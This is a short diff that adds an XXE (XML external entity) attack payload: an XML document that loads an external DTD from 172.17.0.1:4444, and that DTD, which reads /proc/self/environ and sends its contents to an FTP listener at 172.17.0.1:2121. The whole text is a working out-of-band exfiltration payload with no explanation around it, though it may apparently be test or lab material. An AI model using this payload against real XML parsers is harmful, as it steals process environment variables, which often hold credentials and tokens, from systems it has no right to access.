@@ -1,0 +1,12 @@
+<?xml version="1.0" ?>
+<!DOCTYPE a [
+        <!ENTITY % asd SYSTEM "http://172.17.0.1:4444/ext.dtd">
+        %asd;
+        %c;
+        ]>
+<a>&rrr;</a>
+
+
+        ## External dtd ##
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://172.17.0.1:2121/%d;'>">
